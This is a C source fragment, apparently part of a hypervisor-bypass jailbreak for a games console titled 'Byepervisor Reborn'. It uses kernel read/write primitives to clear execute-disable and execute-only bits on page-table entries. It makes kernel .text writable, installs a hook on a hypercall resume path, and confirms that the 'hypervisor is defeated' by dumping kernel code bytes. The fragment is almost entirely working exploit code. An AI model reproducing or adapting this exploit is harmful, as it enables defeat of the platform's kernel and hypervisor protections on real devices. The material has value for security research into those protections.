  pdpe_addr = find_pdpe(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pdpe);
  CLEAR_PDE_BIT(pdpe, EXECUTE_DISABLE);
  kwrite64(pdpe_addr, pdpe);

  if (PDE_FIELD(pdpe, PS) != 1) {
    pde_addr = find_pde(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pde);
    CLEAR_PDE_BIT(pde, EXECUTE_DISABLE);
    kwrite64(pde_addr, pde);

    if (PDE_FIELD(pde, PS) != 1) {
      pte_addr = find_pte(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pte);
      CLEAR_PDE_BIT(pte, EXECUTE_DISABLE);
      kwrite64(pte_addr, pte);
    }
  }

  // Disable xotext + enable write on kernel .text pages
  printf("[+] Disabling xotext + enabling write...\n");
  for (uint64_t addr = ktext(0); addr < KERNEL_ADDRESS_DATA_BASE; addr += 0x1000) {
    pde_addr = find_pde(kernel_pmap, addr, &pde);
    if (pde_addr != 0xFFFFFFFFFFFFFFFFull) {
      CLEAR_PDE_BIT(pde, XOTEXT);
      SET_PDE_BIT(pde, RW);
      kwrite64(pde_addr, pde);
    }

    pte_addr = find_pte(kernel_pmap, addr, &pte);
    if (pte_addr != 0xFFFFFFFFFFFFFFFFull) {
      CLEAR_PDE_BIT(pte, XOTEXT);
      SET_PDE_BIT(pte, RW);
      kwrite64(pte_addr, pte);
    }
  }

  // Install hook on startup_mp hypercall
  printf("[+] Installing hook...\n");
  if (kread64(cave + CAVE_STATE_OFF) != STATE_ARMED) {
    int r = install_resume_hook(HOOK_CORE, cave, kernel_pm_cr3);
    if (r) {
      printf("[!] Failed to install hook (likely too large)\n");
      notifyf("[ERROR] Byepervisor Reborn\nHook install failed :(");
      return r;
    }

    printf("[+] Hook installed, enter sleep and resume!\n");
    notifyf("Byepervisor Reborn\nEnter sleep and resume!\n");
  } else {
    printf("khook: hook already ARMED (state survived)\n");
  }

  // Poll for resume and hook trigger
  for (;;) {
    pin_to_core(HOOK_CORE);

    o = kread64(oracle);
    if (o != 0) {
      notifyf("Byepervisor Reborn\nWelcome back, hypervisor is defeated!\nCookie? 0x%lx", o);
      
      printf("[+] Uninstalling hook\n");
      uninstall_hook(HOOK_CORE, cave);

      test_val = kread64(ktext(0));
      test_val_bytes = (uint8_t *) &test_val;
      notifyf("Byepervisor Reborn - Kernel .text first 8 bytes\n%02x %02x %02x %02x %02x %02x %02x %02x", 
      test_val_bytes[0], test_val_bytes[1], test_val_bytes[2], test_val_bytes[3], 
      test_val_bytes[4], test_val_bytes[5], test_val_bytes[6], test_val_bytes[7]);

      // TODO: Patch kernel and all that fun stuff, we don't feel like doing this so someone else can do it :)

      return 0;
    }

    sceKernelSleep(5);
  }
  return 0;
#endif
}
